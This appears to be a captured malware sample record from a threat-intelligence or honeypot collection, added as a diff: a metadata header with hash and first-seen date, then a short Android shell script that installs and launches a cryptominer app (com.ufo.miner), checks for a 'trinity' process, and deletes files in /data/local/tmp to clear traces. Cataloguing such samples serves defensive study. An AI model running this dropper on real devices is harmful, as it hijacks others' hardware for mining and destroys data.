@@ -1,0 +1,15 @@
+# sha256: fd4cb57160a87b9442bc1b801f422c73916e73b15ab1ac07b2136c3518850a7f
+# family: script_generic
+# kind: script
+# size_bytes: 185
+# first_seen: 2026-07-24 10:55:29.939656 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+pm path com.ufo.miner
+pm install /data/local/tmp/ufo.apk
+rm -f /data/local/tmp/ufo.apk
+am start -n com.ufo.miner/com.example.test.MainActivity
+ps | grep trinity
+rm -rf /data/local/tmp/*
